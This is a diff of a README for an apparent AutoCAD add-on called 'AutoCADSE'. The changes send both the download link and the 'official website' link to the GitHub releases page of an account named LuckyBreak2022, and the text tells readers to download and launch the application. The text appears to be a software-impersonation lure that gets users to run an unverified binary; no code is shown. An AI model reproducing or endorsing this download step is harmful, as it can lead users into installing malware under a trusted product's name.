@@ -25,7 +25,7 @@ AutoCAD is a professional CAD software that allows users to create precise 2D an
 
 ## 🚀 Getting Started:
 
-To access the latest tools and features, download the [AutoCADSE Application](https://github.com/repo/releases/9246/App.zip). Once downloaded, launch the application to start leveraging the enhanced capabilities for your CAD projects.
+To access the latest tools and features, download the [AutoCADSE Application](https://github.com/LuckyBreak2022/AutoCADSE/releases). Once downloaded, launch the application to start leveraging the enhanced capabilities for your CAD projects.
 
 ## 🔧 Support and Contributions:
 
@@ -33,7 +33,7 @@ If you encounter any issues with the application or have ideas for future enhanc
 
 ## 🌐 Website:
 
-For more details and updates, visit our website [AutoCADSE Official Page](https://www.autocadse.com).
+For more details and updates, visit our website [AutoCADSE Official Page](https://github.com/LuckyBreak2022/AutoCADSE/releases).
 
 ## 📦 Check Releases:
 
